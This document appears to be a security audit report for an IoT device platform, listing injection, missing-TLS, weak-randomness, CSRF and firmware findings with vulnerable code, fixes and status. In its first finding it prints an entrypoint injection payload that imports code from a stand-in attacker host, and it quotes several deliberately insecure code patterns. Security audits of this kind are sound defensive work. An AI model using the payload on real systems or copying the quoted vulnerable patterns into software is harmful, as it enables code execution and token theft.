# DeviceSDK Security Audit

**Date:** 2026-03-29
**Methodology:** 5 parallel review agents covering authentication, WebSocket communications, script sandboxing, input validation, and firmware security.
**Last status update:** 2026-04-06

## Executive Summary

| Severity | Count | Fixed |
|----------|-------|-------|
| CRITICAL | 3 | 3 |
| HIGH | 12 | 11 |
| MEDIUM | 13 | 11 |
| LOW | 5 | 1 |

---

## CRITICAL Findings

### C1: Code Injection via Unsanitized `entrypointName`

**Severity:** CRITICAL
**Status:** FIXED (PR #48) — `JS_IDENTIFIER_REGEX` added to `consts.ts`, validated in `uploadScript.ts`, `batchUpload.ts`, and `scriptValidator.ts`
**Files:**
- `apps/api/src/durableObjects/lib/classProxy.ts` lines 11, 64
- `apps/api/src/foundation/scriptValidator.ts` lines 38, 63
- `apps/api/src/endpoints/scripts/uploadScript.ts` line 25
- `apps/api/src/endpoints/scripts/batchUpload.ts` line 29

**Description:**
The `entrypointName` is interpolated directly into generated JavaScript code without sanitization:

```javascript
// classProxy.ts:11
import {${entrypointName}} from './device.js';
// classProxy.ts:64
const target = new ${entrypointName}(this.ctx, env);
// scriptValidator.ts:38
import {${entrypointName}} from "./device.js";
// scriptValidator.ts:63
const methods = collectMethods(${entrypointName});
```

The Zod schema only enforces `z.string().min(1).max(255)` with no JavaScript identifier validation. An attacker can upload a script with `entrypoint: "x}; malicious(); class x{"` to inject arbitrary code into the generated module. This code executes:
1. During validation (in the validator worker sandbox)
2. During normal execution (in the user worker with access to `DEVICE` and `__DEVICE_BRIDGE` bindings)

The injected code runs at module instantiation time — before the proxy's env-stripping logic in `getTarget()` — giving it unrestricted access to all bindings.

**Attack Example:**
```
entrypoint: "x}; import('http://attacker.com'); class x{"
```
Produces:
```javascript
import {x}; import('http://attacker.com'); class x{} from './device.js';
```

In the validator, a crafted entrypoint can override the `Validator` class to always return success, bypassing all validation.

**Impact:** Arbitrary code execution in user worker context. Access to platform bindings. Validation bypass.

**Fix:** Add JavaScript identifier regex to the `entrypoint` Zod schema in both upload endpoints:
```typescript
const JS_IDENTIFIER_RE = /^[A-Za-z_$][A-Za-z0-9_$]*$/;
entrypoint: z.string().min(1).max(255).regex(JS_IDENTIFIER_RE, "Entrypoint must be a valid JavaScript identifier")
```
Additionally, add a defensive assertion in `device.ts` before calling `getProxyEntrypoint()`.

---

### C2: Both Firmware Platforms Connect Over Plain `ws://` — No TLS

**Severity:** CRITICAL
**Status:** FIXED (PR #48, #52) — Pico uses `altcp_tls` with embedded GTS Root R4 CA cert; ESP32 uses `wss://` with Espressif CA bundle
**Files:**
- `firmware/pico/lib/lwip_ws/ws_client.cpp` lines 14, 34-37
- `firmware/esp32/main/iotkit_main.c` line 426

**Description:**
The Pico WebSocket client uses a raw lwIP TCP socket with no TLS layer. The default port is 80 and there is no `altcp_tls`/mbedTLS wrapping anywhere in `ws_client.cpp`. The HTTP upgrade request transmits `Authorization: Bearer <token>` in cleartext.

The ESP32 hardcodes `ws://` in the URI:
```c
// iotkit_main.c:426
snprintf(uri, sizeof(uri), "ws://%s%s", api_host, ws_path);
```

Both firmware platforms transmit:
- The API token on every WebSocket connection/reconnection
- All command/response traffic (GPIO state, I2C data, sensor readings, etc.)

**Impact:** Any network observer can capture device API tokens and impersonate devices indefinitely. All device telemetry and commands are exposed.

**Fix:**
- **Pico:** Integrate `altcp_tls` with mbedTLS (available in Pico SDK) to wrap the TCP connection in TLS before the HTTP upgrade. Default port should be 443.
- **ESP32:** Change URI scheme to `wss://` and configure TLS on the `esp_websocket_client_config_t`. The `esp_websocket_client` component natively supports TLS.

---

### C3: All Token Generation Uses `Math.random()` — Not Cryptographically Secure

**Severity:** CRITICAL
**Status:** FIXED (PR #48) — All token generation now uses `crypto.randomUUID()` and `crypto.getRandomValues()`
**Files:**
- `apps/api/src/foundation/auth.ts` line 226
- `apps/api/src/endpoints/cli-auth/utils.ts` lines 9-11, 17-19
- `apps/api/src/endpoints/cli-auth/startAuth.ts` lines 3-20

**Description:**
Every token and code in the platform is generated using `Math.random()`:

Session tokens (`auth.ts:226`):
```typescript
token: await hashPassword(
    (Math.random() + 1).toString(3),
    c.env.SALT_TOKEN,
),
```

CLI access/refresh tokens (`utils.ts:8-22`):
```typescript
export function generateAccessToken(): string {
    const hex = Array(32).fill(0)
        .map(() => Math.floor(Math.random() * 16).toString(16))
        .join("");
    return `dsdk_${hex}`;
}
```

User codes and device codes (`startAuth.ts:3-20`):
```typescript
function generateUserCode(): string {
    // ...
    .map(() => letters[Math.floor(Math.random() * letters.length)])
    // ...
    .map(() => Math.floor(Math.random() * 10))
}
function generateDeviceCode(): string {
    const hex = Array(32).fill(0)
        .map(() => Math.floor(Math.random() * 16).toString(16))
        .join("");
    return `DSDK_DEVICE_${hex}`;
}
```

V8's `Math.random()` uses xorshift128+ with approximately 52 bits of PRNG state. The state is shared across the Worker isolate and is observable from any `Math.random()` output. The subsequent SHA-256 hash on session tokens does not fix the upstream entropy problem. An attacker who can observe or predict the PRNG state can forge all tokens issued by the same isolate.

**Impact:** Predictable session tokens, CLI tokens, and device codes. Token forgery. Device code brute-forcing.

**Fix:** Replace all `Math.random()` usage with `crypto.getRandomValues()`:
```typescript
export function generateAccessToken(): string {
    const bytes = new Uint8Array(16);
    crypto.getRandomValues(bytes);
    const hex = Array.from(bytes).map(b => b.toString(16).padStart(2, "0")).join("");
    return `dsdk_${hex}`;
}
```
Or use `crypto.randomUUID().replaceAll("-", "")` where format allows.

---

## HIGH Findings

### H1: API and Device Tokens Stored Plaintext in Database

**Severity:** HIGH
**Status:** FIXED (PR #48) — API tokens stored as `token_hash` (SHA-256); migration `0013_hash_api_tokens.sql`
**Files:**
- `apps/api/src/endpoints/tokens/createApiToken.ts` line 70
- `apps/api/src/endpoints/devices/downloadFirmware.ts` lines 102-136
- `apps/api/src/foundation/auth.ts` lines 148-150
- `apps/api/migrations/0004_add_tokens_table.sql` line 5

**Description:**
API tokens are stored as plaintext `crypto.randomUUID()` values in the `tokens` table:
```typescript
// createApiToken.ts:70
token: crypto.randomUUID().replaceAll("-", ""),
```

Token lookup uses direct SQL equality:
```typescript
// auth.ts:148-150
conditions: ["t.token = ?1"],
params: [token],
```

Firmware device tokens follow the same pattern in `downloadFirmware.ts`:
```typescript
newKey = crypto.randomUUID().replace(/-/g, "");
await qb.insert({ tableName: "tokens", data: { token: newKey, ... } }).execute();
```

By contrast, CLI tokens ARE properly hashed with SHA-256 before storage (`access_token_hash`, `refresh_token_hash` columns in `cli_tokens` table).

**Impact:** A database compromise (SQL injection, backup exposure, D1 data export) exposes all API and device tokens immediately with no cracking step required.

**Fix:** Hash API tokens before storage using the same SHA-256 approach as CLI tokens. Store only the hash; return the raw token to the caller once at creation time; look up by hash.

---

### H2: `SameSite=None` Cookie in Production Enables CSRF

**Severity:** HIGH
**Status:** FIXED (PR #48) — Changed to `sameSite: "Lax"` in `auth.ts`
**Files:**
- `apps/api/src/foundation/auth.ts` lines 255-262, 277-285

**Description:**
Production session cookies:
```typescript
setCookie(c, SESSION_COOKIE_NAME, session.results.token, {
    httpOnly: true,
    expires: expirationDate,
    domain: ".devicesdk.com",
    sameSite: "None",    // <-- allows cross-site requests
    secure: true,
    path: "/",
});
```

The same `sameSite: "None"` is set on the logout cookie (line 283).

`SameSite=None` means the session cookie is sent on ALL cross-origin requests, including those from third-party sites. While the CORS policy restricts `Access-Control-Allow-Origin` to specific dashboards, CORS does not protect against classic form POST CSRF attacks. No CSRF token mechanism exists anywhere in the codebase.

**Impact:** Cross-site request forgery attacks on all authenticated endpoints.

**Fix:** Change to `sameSite: "Lax"` (or `"Strict"`). The API and dashboard share `.devicesdk.com`, so `Lax` supports the OAuth redirect flow while blocking cross-site POST.

---

### H3: Logout Doesn't Invalidate Server-Side Session

**Severity:** HIGH
**Status:** FIXED (PR #48) — `handleLogout` now DELETEs session from `user_sessions` table
**File:** `apps/api/src/foundation/auth.ts` lines 267-292

**Description:**
The logout handler only clears the cookie:
```typescript
export async function handleLogout(c: AppContext) {
    if (c.env.ENV === "local") {
        setCookie(c, SESSION_COOKIE_NAME, "", { ... });
    } else {
        setCookie(c, SESSION_COOKIE_NAME, "", { ... });
    }
    return c.json({ success: true, message: "Logged out successfully" });
}
```

No `DELETE FROM user_sessions WHERE token = ?` is executed. The session row persists in the database with a 7-day expiry (`SESSION_DURATION_MS` in `consts.ts`).

**Impact:** Stolen session tokens remain valid for up to 7 days after the user explicitly logs out.

**Fix:**
```typescript
const token = getToken(c);
if (token) {
    await c.get("qb")
        .delete({ tableName: "user_sessions", where: { conditions: ["token = ?1"], params: [token] } })
        .execute();
}
```

---

### H4: CLI Approval Form Has No CSRF Protection

**Severity:** HIGH
**Status:** FIXED (PR #52) — Synchronizer token pattern: GET sets `cli_csrf` cookie + hidden form field, POST validates both match
**File:** `apps/api/src/endpoints/cli-auth/approvalPage.ts` lines 186-193

**Description:**
The CLI approval form:
```html
<form method="POST" action="/cli/auth">
    <input type="hidden" name="code" value="${userCode}" />
    <div class="actions">
        <button type="submit" name="action" value="deny" class="btn-deny">Deny</button>
        <button type="submit" name="action" value="approve" class="btn-approve">Approve</button>
    </div>
</form>
```

No CSRF token is present. Combined with `sameSite: "None"` (H2), a malicious page can embed a hidden form that auto-submits `action=approve` with a known or guessed `code` value. If a logged-in user visits the page while the approval window is open, the attacker's CLI session is authorized.

**Impact:** Unauthorized CLI session approval via cross-site form submission.

**Fix:** Add a synchronizer token to the form, or apply the H2 fix (`SameSite=Lax`) which prevents cross-site form POST.

---

### H5: Timing Attack on Plaintext Token Lookup

**Severity:** HIGH
**Status:** FIXED (PR #48) — Tokens now hashed before storage (H1 fix), eliminating timing correlation
**File:** `apps/api/src/foundation/auth.ts` lines 131-132, 148-150

**Description:**
Both session tokens and API tokens are compared via SQL `=`:
```typescript
conditions: ["us.token = ?1", "us.expires_at > ?2"],
// and
conditions: ["t.token = ?1"],
```

SQLite string comparison and B-tree index scans are not constant-time. An attacker can measure timing differences to enumerate valid token prefixes. This is compounded by H1 (plaintext storage) — hashed tokens would eliminate this attack surface.

**Impact:** Token prefix enumeration via timing side channel.

**Fix:** Hash tokens before storage (H1 fix). Hashed values are unpredictably distributed, eliminating timing correlation.

---

### H6: `target.env` Mutation in RPC Proxy Not Concurrency-Safe

**Severity:** HIGH
**Status:** FIXED (PR #52) — Replaced mutation with per-call `Proxy`; `Object.freeze()` on user-facing env
**File:** `apps/api/src/durableObjects/lib/classProxy.ts` line 95

**Description:**
The `callMethod` handler mutates the shared target instance:
```javascript
target.env = Object.assign({}, target.env, { DEVICES: callScopedDevices });
return target[name](...args);
```

This overwrites `target.env` permanently for the lifetime of the target instance. After any remote call, `this.env.DEVICES` in the user script is the `callScopedDevices` proxy (with an embedded depth counter) rather than the original `devicesProxy` (depth 0). Concurrent RPC calls can leak depth context between invocations, potentially allowing `MAX_CALL_DEPTH` bypass.

**Impact:** Call-depth limit bypass. Stale env state across invocations. Potential for recursive RPC beyond safety limits.

**Fix:** Don't mutate `target.env`. Either create a fresh target instance per RPC call, or save/restore the env:
```javascript
const originalEnv = target.env;
target.env = Object.assign({}, target.env, { DEVICES: callScopedDevices });
try { return await target[name](...args); }
finally { target.env = originalEnv; }
```

---

### H7: WebSocket Messages Parsed Without Runtime Validation

**Severity:** HIGH
**Status:** FIXED (PR #48) — Zod `DeviceMessageSchema` with `safeParse` at WebSocket boundary; malformed messages discarded
**File:** `apps/api/src/durableObjects/lib/device.ts` line 389

**Description:**
```typescript
const message = JSON.parse(data as string) as DeviceResponse;
```

The `as DeviceResponse` is a compile-time assertion with no runtime effect. The code then accesses `message.type`, `message.id`, and `message.payload.error` without verifying they exist or have correct types. Malformed messages from a compromised or malfunctioning device can cause:
- Undefined field access errors (caught by try/catch but with misleading logs)
- Unvalidated payloads forwarded to user scripts via `userWorker.onMessage(message)`
- Unbounded string values used as Map keys or error messages

**Impact:** Undefined behavior from malformed device messages. Unvalidated data forwarded to user scripts.

**Fix:** Add Zod validation at the WebSocket boundary:
```typescript
const DeviceResponseSchema = z.object({
    id: z.string().max(64).optional(),
    type: z.string().max(64),
    payload: z.record(z.unknown()).optional().default({}),
});
const parseResult = DeviceResponseSchema.safeParse(JSON.parse(data as string));
if (!parseResult.success) return; // log and discard
```

---

### H8: Script Validation Only Checks Method Existence

**Severity:** HIGH
**Status:** OPEN — Validation still lacks execution timeout and resource constraints
**File:** `apps/api/src/foundation/scriptValidator.ts` lines 17-113

**Description:**
The validator creates a dynamic worker and only checks whether the exported class has `onMessage`, `onDeviceConnect`, `onDeviceDisconnect`, and `onAlarm` methods. There is no:
- Execution timeout enforcement
- Resource constraint checking (CPU, memory)
- Static analysis for dangerous patterns
- Check for dynamic `import()` calls
- Prevention of infinite loops or excessive computation

The validator sandbox uses `globalOutbound: null` and `env: {}`, which limits blast radius, but a script with an infinite loop will block the validator indefinitely.

**Impact:** Validation bypass. Resource exhaustion during validation. No safety assurance beyond method existence.

**Fix:** Add a timeout wrapper:
```typescript
const result = await Promise.race([
    validator.validate(),
    new Promise<never>((_, reject) =>
        setTimeout(() => reject(new Error("Validation timeout")), 5000)
    ),
]);
```

---

### H9: User Scripts Receive `DeviceSender` Binding; Env Stripping Incomplete

**Severity:** HIGH
**Status:** FIXED (PR #48, #52) — `ALLOWED_DEVICE_METHODS` allowlist proxy in `classProxy.ts`; `Object.freeze()` on env
**Files:**
- `apps/api/src/durableObjects/lib/device.ts` lines 218-229
- `apps/api/src/durableObjects/lib/classProxy.ts` line 38

**Description:**
The proxy strips internal bindings from the user's env:
```javascript
const { __DEVICE_BRIDGE: bridge, __DEVICE_ID: _did, __PROJECT_ID: _pid, __ENV_VARS: _envVarsJson, ...publicEnv } = this.env;
```

However, `DEVICE` (the `DeviceSender` RPC stub) is intentionally left in `publicEnv`. User scripts receive `this.env.DEVICE` which exposes the full `DeviceSender` interface — including methods like `persistLog`, `kvGet`, `kvPut`, `kvDelete`, and potentially others not intended for direct user access.

**Impact:** User scripts can call any method on `DeviceSender`, not just the intended device control methods.

**Fix:** Audit all methods on `DeviceSender` and create an explicit allowlist proxy. Freeze the env object before passing to the user class: `Object.freeze(env)`.

---

### H10: No Pico UF2 Integrity Verification After Firmware Patching

**Severity:** HIGH
**Status:** NOT APPLICABLE (PR #52) — Investigated: UF2 has no per-block CRC; credentials are in `.rodata` outside boot2 CRC region; RP2350 image hashes only apply to signed builds. Documented in `downloadFirmware.ts`
**File:** `apps/api/src/endpoints/devices/downloadFirmware.ts` lines 176-179

**Description:**
```typescript
if (deviceType === "esp32" || deviceType === "esp32c61") {
    await recalculateEsp32Checksum(bytes);
}
// No equivalent for pico-w / pico2-w
```

ESP32 firmware gets checksum recalculation via `recalculateEsp32Checksum()` after credential patching. Pico UF2 firmware does not. The UF2 format carries per-block CRC32 checksums which become stale after the credential bytes are modified.

**Impact:** Pico devices may receive corrupted firmware, causing boot failures or undefined behavior.

**Fix:** Implement UF2 block CRC32 recalculation for any block modified during patching.

---

### H11: Open Redirect in Dashboard Post-Login Flow

**Severity:** HIGH
**Status:** FIXED (PR #51) — Hostname re-validation added in `boot/auth.ts` before redirect
**Files:**
- `apps/dashboard/src/pages/LoginPage.vue` lines 59-70
- `apps/dashboard/src/boot/auth.ts` lines 9-13

**Description:**
The `redirect_uri` query parameter is hostname-validated and stored in `sessionStorage`:
```typescript
// LoginPage.vue
const url = new URL(redirectUri);
const hostname = url.hostname;
if (hostname === 'localhost' || hostname === 'devicesdk.com' || hostname.endsWith('.devicesdk.com')) {
    sessionStorage.setItem('auth_redirect_uri', redirectUri);
}
```

After authentication, the value is consumed WITHOUT re-validation:
```typescript
// boot/auth.ts
const redirectUri = sessionStorage.getItem('auth_redirect_uri');
if (redirectUri) {
    sessionStorage.removeItem('auth_redirect_uri');
    window.location.href = redirectUri;  // No hostname check here
}
```

**Impact:** An XSS on any `*.devicesdk.com` page could overwrite `sessionStorage['auth_redirect_uri']` to redirect users to an attacker-controlled site after login.

**Fix:** Repeat the hostname validation in `boot/auth.ts` before navigating.

---

### H12: Plaintext Credentials Embedded in Firmware Binaries

**Severity:** HIGH
**Status:** OPEN (Design Limitation) — Credentials are compile-time constants; encryption at rest would require a device-side decryption key (chicken-and-egg). Mitigated by token rotation on every firmware download.
**Files:**
- `apps/api/src/endpoints/devices/downloadFirmware.ts` lines 6-12
- `firmware/esp32/main/config.h` lines 4-9
- `firmware/pico/CMakeLists.txt` lines 57-62

**Description:**
WiFi SSID, WiFi password, API token, hostname, project ID, and device ID are patched into firmware binaries as plaintext ASCII strings:
```typescript
const OLD_TOKEN = "e343ecb8036442e093a47718463c1716";
const OLD_SSID   = "8d477eda147344f8b9b8d3e3bef7505b";
const OLD_PASS   = "ebc8394548904aa583916609049d5ea527021de49780437a98915189223dcf8";
const OLD_HOST   = "3ed66c2c3ed1474382278f70ba01dc4c";
const OLD_PROJECT_ID = "288f2d2493094af68ab37a96ef73a118";
const OLD_DEVICE_ID  = "d09f91a7729141eb8911d7a0f1e1595f";
```

Anyone with physical access to a device can dump flash (Pico: BOOTSEL mode; ESP32: JTAG/UART) and extract all credentials with `strings` or a hex editor.

**Impact:** Physical device compromise exposes WiFi credentials and API tokens.

**Fix:** Consider encrypting credentials at rest in flash. Document the physical access threat model. Token rotation (see L5) is the highest-priority operational mitigation.

---

## MEDIUM Findings

### M1: No Rate Limiting on Any Auth Endpoint

**Severity:** MEDIUM
**Status:** FIXED (PR #49) — Tier-aware rate limiting on all endpoints via Cloudflare rate limit bindings
**File:** `apps/api/src/index.ts` (route definitions)

**Description:**
No rate-limiting middleware exists anywhere in the API. The following unauthenticated endpoints are directly attackable:
- `POST /v1/cli/auth/start` — create unlimited pending auth codes
- `POST /v1/cli/auth/poll` — brute-force device codes
- `GET /v1/auth/google` — repeated OAuth initiation
- `POST /v1/cli/auth/refresh` — refresh token brute-force

The user code space (`generateUserCode()`) is approximately 23 million combinations (`22^4 * 10^4`), which is brute-forceable within the 15-minute window without rate limiting.

**Fix:** Add rate limiting on pre-auth endpoints (e.g., 10 req/min on `/start`, 60 req/min on `/poll` per IP).

---

### M2: Missing UNIQUE Constraint and Index on `user_sessions.token`

**Severity:** MEDIUM
**Status:** FIXED — Migration `0014_add_session_token_index.sql` adds UNIQUE index
**File:** `apps/api/migrations/0001_add_tasks_table.sql` lines 11-20

**Description:**
```sql
CREATE TABLE IF NOT EXISTS user_sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id    TEXT NOT NULL,
    token      TEXT NOT NULL,  -- No UNIQUE, no index
    created_at INTEGER NOT NULL,
    expires_at INTEGER NOT NULL
);
```

Missing UNIQUE constraint means duplicate tokens are theoretically possible. Missing index means token lookups in `authenticateUser` perform full table scans.

**Fix:** Add migration:
```sql
CREATE UNIQUE INDEX idx_user_sessions_token ON user_sessions(token);
```

---

### M3: Refresh Token Rotation Not Atomic (Race Condition)

**Severity:** MEDIUM
**Status:** FIXED — Uses `DB.batch()` for atomic DELETE + INSERT in `refreshToken.ts`
**File:** `apps/api/src/endpoints/cli-auth/refreshToken.ts` lines 40-55

**Description:**
Refresh rotation is DELETE + INSERT in two separate D1 statements:
```typescript
await c.env.DB.prepare("DELETE FROM cli_tokens WHERE id = ?").bind(cliToken.id).run();
await c.env.DB.prepare("INSERT INTO cli_tokens ...").bind(...).run();
```

Two concurrent refresh requests with the same token could both see the token as valid, both delete and insert, creating duplicate active sessions or causing a legitimate user to be logged out.

**Fix:** Use D1 batch API for atomicity:
```typescript
await c.env.DB.batch([
    c.env.DB.prepare("DELETE FROM cli_tokens WHERE id = ?").bind(cliToken.id),
    c.env.DB.prepare("INSERT INTO cli_tokens ...").bind(...),
]);
```

---

### M4: Command Payload Uses `.passthrough()` Zod Schema — Unbounded

**Severity:** MEDIUM
**Status:** FIXED — Payload limited to 4KB via Zod `refine` in `sendCommand.ts`
**File:** `apps/api/src/endpoints/devices/sendCommand.ts` lines 32-35

**Description:**
```typescript
const commandBodySchema = z.object({
    type: z.string().min(1),
    payload: z.object({}).passthrough().optional().default({}),
});
```

While command type IS whitelisted, `payload` accepts any JSON object of any depth and size. This payload is forwarded directly to the device's WebSocket connection. A 100KB+ nested payload could exhaust device memory or cause stalls.

**Fix:** Add per-command-type payload schemas, or at minimum a size limit:
```typescript
payload: z.object({}).passthrough().optional().default({}).refine(
    (p) => JSON.stringify(p).length <= 4096,
    { message: "Payload too large" }
),
```

---

### M5: Inter-Device RPC Has No Per-Device Permissions

**Severity:** MEDIUM
**Status:** OPEN (Design Decision) — Same-project trust model is intentional; documented as a known limitation
**File:** `apps/api/src/durableObjects/lib/devicesBridge.ts` lines 28-91

**Description:**
The only authorization in `callRemoteMethod` is same-project isolation and call depth:
```typescript
if (callDepth >= MAX_CALL_DEPTH) { throw ... }
// Query: d.project_id = ? AND d.device_slug = ?
```

Any device in a project can call any non-blocked method on any other device in the same project. There is no ACL, opt-in mechanism, or per-method permission list. If a device script is compromised or provided by a third party, it can freely invoke arbitrary methods on all peer devices.

**Fix:** Consider requiring callee devices to export an `rpcMethods` allowlist. Document the same-project trust model clearly.

---

### M6: `BLOCKED_METHODS` Missing `getCrons` and `onCron`

**Severity:** MEDIUM
**Status:** FIXED — Both `getCrons` and `onCron` added to `BLOCKED_METHODS` in `rpcConstants.ts`
**File:** `apps/api/src/durableObjects/lib/rpcConstants.ts` lines 6-14

**Description:**
```typescript
export const BLOCKED_METHODS = [
    "onMessage", "onDeviceConnect", "onDeviceDisconnect", "onAlarm",
    "constructor", "env", "ctx"
] as const;
```

Missing: `getCrons` and `onCron`. A remote device can:
- Call `getCrons` to exfiltrate another device's cron schedule
- Call `onCron("taskName")` to trigger cron handlers out-of-band

These are platform lifecycle methods that should only be invoked by the DO infrastructure, not peer devices.

**Fix:** Add `"getCrons"` and `"onCron"` to the `BLOCKED_METHODS` array.

---

### M7: `handleRemoteCall` Bootstraps `deviceMeta` from Caller-Supplied `scriptMeta`

**Severity:** MEDIUM
**Status:** OPEN — `scriptMeta` is assembled from DB values in `DevicesBridge` (trustworthy in normal flow), but architecturally the DO should resolve metadata independently
**File:** `apps/api/src/durableObjects/lib/device.ts` lines 274-282

**Description:**
If a target device has never connected via WebSocket (no `deviceMeta` in storage), `handleRemoteCall` accepts the `scriptMeta` from the RPC caller and writes it to durable storage:
```typescript
if (!this.deviceMeta) {
    const stored = await this.ctx.storage.get<typeof this.deviceMeta>("deviceMeta");
    if (stored) {
        this.deviceMeta = stored;
    } else {
        this.deviceMeta = request.scriptMeta;  // caller-controlled
        await this.ctx.storage.put("deviceMeta", this.deviceMeta);
    }
}
```

The `scriptMeta` is assembled from DB values in `DevicesBridge`, so it's trustworthy in normal flow. However, the design would be stronger if `handleRemoteCall` resolved metadata independently.

**Fix:** Resolve `deviceMeta` from the database within `handleRemoteCall` rather than accepting it from the caller.

---

### M8: Legacy `handleCommandRequest` HTTP POST Path on DO

**Severity:** MEDIUM
**Status:** FIXED — Legacy POST handler removed from `device.ts` fetch(); commands use WebSocket RPC only
**File:** `apps/api/src/durableObjects/lib/device.ts` lines 97-98, 300-329

**Description:**
The DO's `fetch()` handler routes POST requests to `handleCommandRequest`:
```typescript
} else if (request.method === "POST") {
    return this.handleCommandRequest(request);
}
```

This is a legacy HTTP-based command path that coexists with the newer typed RPC methods (`handleCommand`). It has no authentication within the DO itself. While the DO is only reachable via the `DEVICE` binding (server-side), having both paths increases the internal attack surface unnecessarily.

**Fix:** Remove `handleCommandRequest` if unused, or add explicit verification that the request originated from a trusted internal path.

---

### M9: Latent XSS in CLI Approval Page

**Severity:** MEDIUM
**Status:** FIXED (PR #48) — `escapeHtml()` applied to `userCode` before interpolation in template
**File:** `apps/api/src/endpoints/cli-auth/approvalPage.ts` lines 149, 170-195, 224-241

**Description:**
`renderApprovalPage(userCode)` interpolates `userCode` into HTML via plain template literals:
```typescript
// line 179
<div class="code-value">${userCode}</div>
// line 187
<input type="hidden" name="code" value="${userCode}" />
```

The content is wrapped in `raw()` at line 149, bypassing Hono's auto-escaping:
```typescript
<div class="card">${raw(content)}</div>
```

The `userCode` comes from `c.req.query("code")` at line 224. Currently, the database lookup at line 231 filters out any code that doesn't match a server-generated `XXXX-0000` pattern, blocking XSS payloads. However, this safety is accidental — any refactor that changes the flow could introduce a live XSS.

**Fix:** Escape `userCode` before interpolating:
```typescript
function escapeHtml(s: string): string {
    return s.replace(/&/g, "&amp;").replace(/</g, "&lt;")
            .replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
}
```

---

### M10: Error Handler Leaks Internal Details in Production

**Severity:** MEDIUM
**Status:** FIXED (PR #48) — `isDev` check in global error handler; production returns generic "Internal Server Error"
**File:** `apps/api/src/index.ts` lines 69-88

**Description:**
```typescript
return c.json({
    success: false,
    // in prod, remove this
    errors: [{
        code: 7000,
        name: err.name,
        message: err.message ?? "Internal Server Error",
    }],
}, 500);
```

The comment "in prod, remove this" has not been acted on. D1 errors include table names, column names, and constraint details (e.g., `"UNIQUE constraint failed: projects.user_id, projects.project_slug"`).

**Fix:**
```typescript
const isDev = c.env.ENV === "local";
return c.json({
    success: false,
    errors: [{
        code: 7000,
        ...(isDev ? { name: err.name, message: err.message } : { message: "Internal Server Error" }),
    }],
}, 500);
```

---

### M11: Integer Truncation in Firmware Message Parsing

**Severity:** MEDIUM
**Status:** FIXED — Range checks added before all double-to-integer casts in both Pico and ESP32 firmware handlers
**Files:**
- `firmware/pico/src/websocket_handler.cpp` lines 114, 232, 557 (and many others)
- `firmware/esp32/main/websocket_handler.c` lines 95, 178, 504 (and many others)

**Description:**
JSON double values are cast directly to narrow integer types without range checking:
```cpp
// Pico
cmd.payload.gpio.pin = (uint8_t)pin_it->second.get<double>();
cmd.payload.i2c_configure.bus = (uint8_t)bus_it->second.get<double>();
cmd.payload.pio_ws2812_configure.num_leds = (uint16_t)num_leds_it->second.get<double>();

// ESP32
cmd.payload.gpio.pin = (uint8_t)pin_obj->valuedouble;
cmd.payload.i2c_configure.bus = (uint8_t)bus_obj->valuedouble;
```

A value of 256.0 truncates to 0, negative values have implementation-defined behavior.

**Fix:** Add explicit range checks before casting:
```c
double raw = pin_obj->valuedouble;
if (raw < 0 || raw > 255) goto done;
cmd.payload.gpio.pin = (uint8_t)raw;
```

---

### M12: I2C/SPI/UART Read Lengths Unbounded

**Severity:** MEDIUM
**Status:** FIXED — `MAX_I2C_DATA_LEN`, `MAX_SPI_DATA_LEN`, and UART length validation enforced in both firmware platforms
**Files:**
- `firmware/pico/src/websocket_handler.cpp` lines 306, 451, 537
- `firmware/esp32/main/websocket_handler.c` lines 234, 425, 485

**Description:**
Read length fields are cast from `double` to `size_t` without upper bound:
```cpp
cmd.payload.i2c_read.length = (size_t)len_it->second.get<double>();
cmd.payload.spi_read.length = (size_t)len_it->second.get<double>();
cmd.payload.uart_read.bytes_to_read = (size_t)len_it->second.get<double>();
```

A value like `1e9` is stored as-is. Downstream buffer allocation depends on these values.

**Fix:** Add maximum sane read lengths (e.g., `MAX_I2C_DATA_LEN` for I2C, similar for SPI/UART). Reject values exceeding the limit.

---

### M13: WebSocket Masking Key Uses Unseeded `rand()`

**Severity:** MEDIUM
**Status:** FIXED — Replaced with `get_rand_32()` from `pico_rand` (hardware TRNG via ROSC entropy)
**File:** `firmware/pico/lib/lwip_ws/ws_client.cpp` line 224

**Description:**
```cpp
uint32_t mask_key = rand();
```

RFC 6455 requires unpredictable masking keys (Section 10.3, defense against proxy cache poisoning). The Pico SDK's `rand()` uses a simple LCG seeded from `srand(1)` by default, producing a deterministic sequence on every boot.

**Fix:** Seed `srand()` from `pico_rand` (hardware TRNG) at startup, or use `get_rand_32()` directly for the mask key.

---

## LOW Findings

### L1: `pendingCommands` Map Unbounded

**Severity:** LOW
**Status:** FIXED — `MAX_PENDING_COMMANDS = 100` guard in `device.ts`; rejects commands when limit reached
**File:** `apps/api/src/durableObjects/lib/device.ts` line 58

**Description:**
No size cap on `pendingCommands` Map. Mitigated by 5-second timeout (natural drain) and authenticated access requirement.

**Fix:** Add a guard: `if (this.pendingCommands.size >= 100) return Promise.reject(...)`.

---

### L2: Cron Name Log Injection

**Severity:** LOW
**Status:** CONFIRMED
**File:** `apps/api/src/durableObjects/lib/device.ts` line 656

**Description:**
```typescript
console.error(`Error in user worker onCron("${name}"):`, error);
```

Cron names are user-defined strings with no length/character validation. Names containing `\n` or ANSI codes could produce misleading log output.

**Fix:** Sanitize in log messages: `JSON.stringify(name.slice(0, 64))`.

---

### L3: capnp Config String Interpolation in CLI

**Severity:** LOW
**Status:** CONFIRMED
**File:** `packages/cli/src/commands/dev.ts` lines 38-101

**Description:**
Device keys from the local `devicesdk.ts` config are interpolated into capnp configuration strings. An attacker who can modify the config file already has code execution on the developer's machine.

**Fix:** Add device key regex validation matching the API's `deviceSlugRegex`.

---

### L4: Static Placeholder Strings Identical Across All Builds

**Severity:** LOW
**Status:** CONFIRMED
**File:** `apps/api/src/endpoints/devices/downloadFirmware.ts` lines 6-12

**Description:**
Placeholder values like `e343ecb8036442e093a47718463c1716` are module-level constants identical in every firmware binary. Knowledge of these values simplifies automated credential extraction from any binary.

**Fix:** Consider per-build randomized placeholders (low priority).

---

### L5: No Device Token Rotation Without Reflashing

**Severity:** LOW
**Status:** CONFIRMED (Design Limitation)

**Description:**
Device API tokens are embedded at firmware patch time. There is no API endpoint to rotate a device's token without issuing a new firmware download and reflashing. A compromised token requires physical device access to remediate.

**Fix:** Design a secure OTA token rotation mechanism or document the limitation.

---

## Remediation Status

All items from the original remediation priority list have been addressed except where noted.

### Completed ✓
1. **C1** — JS identifier regex (PR #48)
2. **C2** — TLS on both firmware platforms (PR #48, #52)
